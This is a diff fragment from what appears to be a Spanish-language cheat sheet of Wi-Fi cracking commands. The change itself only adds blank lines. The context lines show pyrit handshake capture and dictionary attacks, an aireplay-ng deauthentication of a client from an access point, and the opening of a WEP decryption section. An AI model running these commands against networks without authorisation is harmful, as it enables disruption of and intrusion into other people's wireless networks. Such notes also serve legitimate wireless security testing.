@@ -36,6 +36,9 @@ pyrit -r wlan0mon -o <save_file> striplive
 aireplay-ng -0 1 -a <bssid_AP> -c <bssid_de_un_cliente> wla0mon
 pyrit -b <bssid> -i <diccionario> -r <captura.cap> attack_passthrough
 
+
+
+
 #-------------------------------------------------WEP-------------------------------------------------------
 # DESCIFRADO WEP CON CLIENTES CONECTADOS
 airmon-ng start wlan0 
